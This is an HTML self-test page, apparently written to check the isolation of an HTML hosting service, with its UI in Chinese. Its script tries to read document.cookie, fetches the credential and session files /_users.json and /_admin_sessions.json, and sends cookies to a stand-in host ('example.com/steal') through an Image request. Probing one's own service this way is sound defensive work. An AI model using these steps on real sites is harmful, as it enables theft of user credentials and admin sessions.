<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>安全测试页面</title>
<style>
body{font-family:system-ui;background:#0f0c29;color:#fff;padding:20px;max-width:600px;margin:0 auto}
h1{font-size:20px;margin-bottom:20px;color:#a5b4fc}
.test{background:rgba(255,255,255,.05);border-radius:10px;padding:14px;margin-bottom:10px;border-left:4px solid #667eea}
.test.pass{border-left-color:#22c55e}
.test.fail{border-left-color:#ef4444}
.test .name{font-weight:600;margin-bottom:6px}
.test .result{font-size:13px;opacity:.8;word-break:break-all}
.pass .status{color:#22c55e}
.fail .status{color:#ef4444}
</style>
</head>
<body>
<h1>🔐 发发托管安全测试</h1>

<div class="test" id="t1">
  <div class="name">1. JS执行能力 <span class="status">测试中...</span></div>
  <div class="result">如果能看到这段文字，说明JS正常执行（HTML托管预期行为）</div>
</div>

<div class="test" id="t2">
  <div class="name">2. Cookie读取测试 <span class="status">测试中...</span></div>
  <div class="result">尝试读取 document.cookie</div>
</div>

<div class="test" id="t3">
  <div class="name">3. 读取敏感文件 _users.json <span class="status">测试中...</span></div>
  <div class="result">尝试 fetch('/_users.json')</div>
</div>

<div class="test" id="t4">
  <div class="name">4. 读取管理员会话文件 <span class="status">测试中...</span></div>
  <div class="result">尝试 fetch('/_admin_sessions.json')</div>
</div>

<div class="test" id="t5">
  <div class="name">5. 跨域窃取Cookie测试 <span class="status">测试中...</span></div>
  <div class="result">尝试用Image标签外发Cookie</div>
</div>

<script>
function setResult(id, pass, msg){
  const el = document.getElementById(id);
  el.classList.add(pass ? 'pass' : 'fail');
  el.querySelector('.status').textContent = pass ? '✅ 安全' : '❌ 危险';
  el.querySelector('.result').textContent = msg;
}

// 测试1: JS执行
setResult('t1', true, 'JS正常执行（HTML托管功能正常，预期行为）');

// 测试2: Cookie读取
const cookie = document.cookie;
if(cookie === '' || cookie === null){
  setResult('t2', true, 'Cookie为空，HttpOnly防护生效，JS读不到管理员凭证');
}else{
  setResult('t2', false, '⚠️ 读到Cookie: ' + cookie.substring(0,50) + '... 存在风险！');
}

// 测试3: 读取_users.json
fetch('/_users.json')
  .then(r => r.text())
  .then(data => {
    if(data.includes('password') || data.includes('users')){
      setResult('t3', false, '⚠️ 成功读取到_users.json！内容: ' + data.substring(0,100));
    }else{
      setResult('t3', true, '读取被拒绝，返回: ' + data.substring(0,50));
    }
  })
  .catch(e => {
    setResult('t3', true, '请求被CSP/同源策略拦截: ' + e.message);
  });

// 测试4: 读取管理员会话
fetch('/_admin_sessions.json')
  .then(r => r.text())
  .then(data => {
    if(data.includes('token') || data.includes('sessions')){
      setResult('t4', false, '⚠️ 成功读取到管理员会话！内容: ' + data.substring(0,100));
    }else{
      setResult('t4', true, '读取被拒绝，返回: ' + data.substring(0,50));
    }
  })
  .catch(e => {
    setResult('t4', true, '请求被CSP/同源策略拦截: ' + e.message);
  });

// 测试5: 跨域外发Cookie（用Image，不受CORS限制）
setTimeout(() => {
  const img = new Image();
  img.onload = () => setResult('t5', false, '⚠️ Cookie成功外发！存在数据泄露风险');
  img.onerror = () => setResult('t5', true, '外发请求被CSP拦截，无法发送数据到外部');
  img.src = 'https://example.com/steal?cookie=' + encodeURIComponent(document.cookie);
}, 500);
</script>
</body>
</html>
